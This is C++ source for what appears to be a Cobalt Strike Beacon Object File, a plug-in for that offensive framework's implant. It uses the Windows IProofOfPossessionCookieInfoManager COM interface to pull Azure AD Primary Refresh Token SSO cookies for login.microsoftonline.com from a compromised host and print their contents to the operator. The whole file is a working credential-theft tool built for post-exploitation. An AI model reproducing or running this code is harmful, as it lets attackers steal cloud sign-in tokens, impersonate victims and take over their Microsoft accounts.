#include <general.h>

typedef struct ProofOfPossessionCookieInfo {
    WCHAR* name;
    WCHAR* data;
    ULONG  flags;
    WCHAR* p3pHeader;
} ProofOfPossessionCookieInfo;

#undef INTERFACE
#define INTERFACE IProofOfPossessionCookieInfoManager

DECLARE_INTERFACE_IID_( IProofOfPossessionCookieInfoManager, IUnknown, "CDAECE56-4EDF-43DF-B113-88E4556FA1BB" )
{
    STDMETHOD ( QueryInterface )( THIS_ REFIID riid, void** ppvObject ) PURE;
    STDMETHOD_( ULONG, AddRef )( THIS ) PURE;
    STDMETHOD_( ULONG, Release )( THIS ) PURE;
    STDMETHOD ( GetCookieInfoForUri )( THIS_ LPCWSTR uri, ULONG* cookieInfoCount, ProofOfPossessionCookieInfo** cookieInfo ) PURE;
};

static const GUID CLSID_ProofOfPossessionCookieInfoManager = 
    { 0xA9927F85, 0xA304, 0x4390, { 0x8B, 0x23, 0xA7, 0x5F, 0x1C, 0x66, 0x86, 0x00 } };

static const GUID IID_IProofOfPossessionCookieInfoManager = 
    { 0xCDAECE56, 0x4EDF, 0x43DF, { 0xB1, 0x13, 0x88, 0xE4, 0x55, 0x6F, 0xA1, 0xBB } };

auto AzPrtExtract( WCHAR* Nonce ) -> VOID {
    auto BaseUri     = L"https://login.microsoftonline.com/";
    auto LoginUri    = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";
    auto FullUri     = static_cast<PWCHAR>( nullptr );
    auto CookieCount = ULONG{ 0 };
    
    if ( Nonce != nullptr ) {
        auto LoginLen = wcslen( LoginUri );
        auto NonceLen = wcslen( Nonce );
        auto TotalLen = LoginLen + NonceLen + 1;
        
        FullUri = (WCHAR*)malloc( TotalLen * sizeof( WCHAR ) );
        if ( ! FullUri ) {
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate memory" ); return;
        }
        
        wcscpy( FullUri, LoginUri );
        wcscat( FullUri, Nonce );
        BaseUri = FullUri;
    }
    
    BeaconPrintf( CALLBACK_OUTPUT, "Using URI: %S", BaseUri );
    
    ProofOfPossessionCookieInfo*         Cookies          = nullptr;
    IProofOfPossessionCookieInfoManager* PopCookieManager = nullptr;
    
    auto Cleanup = [&]( VOID ) -> VOID {
        if ( Cookies ) {
            for ( ULONG i = 0; i < CookieCount; i++ ) {
                if ( Cookies[i].name      ) CoTaskMemFree( Cookies[i].name );
                if ( Cookies[i].data      ) CoTaskMemFree( Cookies[i].data );
                if ( Cookies[i].p3pHeader ) CoTaskMemFree( Cookies[i].p3pHeader );
            }
            
            CoTaskMemFree( Cookies );
        }
        
        if ( FullUri          ) free( FullUri );
        if ( PopCookieManager ) PopCookieManager->Release();
        
        CoUninitialize();
    };
    
    HRESULT Result = CoInitializeEx( nullptr, COINIT_MULTITHREADED );
    if ( Result == RPC_E_CHANGED_MODE ) {
        Result = CoInitializeEx( nullptr, COINIT_APARTMENTTHREADED );
    }
    
    if ( FAILED( Result ) ) {
        BeaconPrintf( CALLBACK_ERROR, "CoInitializeEx error: 0x%08x", Result );
        if ( FullUri ) free( FullUri ); return;
    }
    
    Result = CoCreateInstance( CLSID_ProofOfPossessionCookieInfoManager, nullptr, CLSCTX_INPROC_SERVER, IID_IProofOfPossessionCookieInfoManager, reinterpret_cast<void**>( &PopCookieManager ) );
    if ( FAILED( Result ) ) {
        BeaconPrintf( CALLBACK_ERROR, "CoCreateInstance error: 0x%08x", Result ); return Cleanup();
    }
    
    Result = PopCookieManager->GetCookieInfoForUri( BaseUri, &CookieCount, &Cookies );
    
    if ( FAILED( Result ) ) {
        BeaconPrintf( CALLBACK_ERROR, "GetCookieInfoForUri error: 0x%08x", Result ); return Cleanup();
    }
    
    if ( CookieCount == 0 ) {
        BeaconPrintf( CALLBACK_OUTPUT, "No cookies for the URI" );
    } else {
        for ( ULONG i = 0; i < CookieCount; i++ ) {
            BeaconPrintf( CALLBACK_OUTPUT, "Name: %S",        Cookies[i].name      );
            BeaconPrintf( CALLBACK_OUTPUT, "Data: %S",        Cookies[i].data      );
            BeaconPrintf( CALLBACK_OUTPUT, "Flags: 0x%x",     Cookies[i].flags     );
            BeaconPrintf( CALLBACK_OUTPUT, "P3PHeader: %S\n", Cookies[i].p3pHeader );
        }
    }
    
    BeaconPrintf( CALLBACK_OUTPUT, "Done" );
    return Cleanup();
}

EXTERN_C auto go( CHAR* Args, INT32 Argc ) -> VOID {
    datap Parser = { 0 };
    
    BeaconDataParse( &Parser, Args, Argc );
    WCHAR* Nonce = (WCHAR*)BeaconDataExtract( &Parser, nullptr );
    
    return AzPrtExtract( Nonce );
}